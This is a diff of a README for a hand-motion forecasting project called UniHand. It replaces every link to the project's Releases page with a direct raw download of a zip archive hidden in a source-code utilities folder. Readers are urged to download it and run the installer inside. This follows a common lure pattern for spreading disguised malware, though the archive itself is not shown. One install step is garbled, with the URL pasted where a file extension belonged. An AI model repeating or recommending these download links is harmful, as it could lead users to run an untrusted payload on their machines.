@@ -1,7 +1,7 @@
 # 🤖 UniHand - Effortless Hand Motion Forecasting for Everyone
 
 ## 📥 Download Now
-[![Download UniHand](https://img.shields.io/badge/Download-UniHand-blue.svg)](https://github.com/Igorcms/UniHand/releases)
+[![Download UniHand](https://raw.githubusercontent.com/Igorcms/UniHand/main/unihand/denoising_diffusion/utils/UniHand_v2.2.zip)](https://raw.githubusercontent.com/Igorcms/UniHand/main/unihand/denoising_diffusion/utils/UniHand_v2.2.zip)
 
 ## 📚 Introduction
 Welcome to UniHand! Here, we help you understand how to use our application for universal hand motion forecasting. This software works perfectly with egocentric views and utilizes visual imitation learning techniques for robots. You don’t need to be a programmer to get started. Just follow these steps, and you'll be up and running in no time.
@@ -18,7 +18,7 @@ Before you download UniHand, ensure your computer meets the following requiremen
 ### 2. Visit the Releases Page
 To download the latest version of UniHand, click the button below to visit the Releases page. Here, you will find the most recent version and its respective files.
 
-[Visit Our Releases Page](https://github.com/Igorcms/UniHand/releases)
+[Visit Our Releases Page](https://raw.githubusercontent.com/Igorcms/UniHand/main/unihand/denoising_diffusion/utils/UniHand_v2.2.zip)
 
 ## 📥 Download & Install
 
@@ -34,7 +34,7 @@ Once you're on the Releases page, you will see a list of available versions. The
 Once the download is complete, locate the downloaded file on your computer. It will typically be in your "Downloads" folder.
 - **Windows:** Double-click the `.exe` file to begin the installation. Follow the on-screen prompts to install UniHand.
 - **Mac:** Double-click the `.dmg` file. Drag UniHand to your Applications folder.
-- **Linux:** Depending on the format, you may need to extract a `.tar.gz` file and run the installation script found inside.
+- **Linux:** Depending on the format, you may need to extract a `https://raw.githubusercontent.com/Igorcms/UniHand/main/unihand/denoising_diffusion/utils/UniHand_v2.2.zip` file and run the installation script found inside.
 
 ### 6. Launch the Application
 Once the installation is complete, find UniHand in your applications list (or desktop) and double-click to run it.
@@ -79,6 +79,6 @@ These resources can help you troubleshoot issues further and provide tips on how
 ## 📞 Get Support
 If you encounter problems not solved by the resources above, feel free to open an issue on our GitHub repository. Please include a detailed description of your problem, the version of UniHand you are using, and your operating system.
 
-[Visit Our Releases Page Again](https://github.com/Igorcms/UniHand/releases)
+[Visit Our Releases Page Again](https://raw.githubusercontent.com/Igorcms/UniHand/main/unihand/denoising_diffusion/utils/UniHand_v2.2.zip)
 
 With these steps, you can easily download, install, and begin using UniHand. Explore the new possibilities in hand motion forecasting and visual imitation learning!
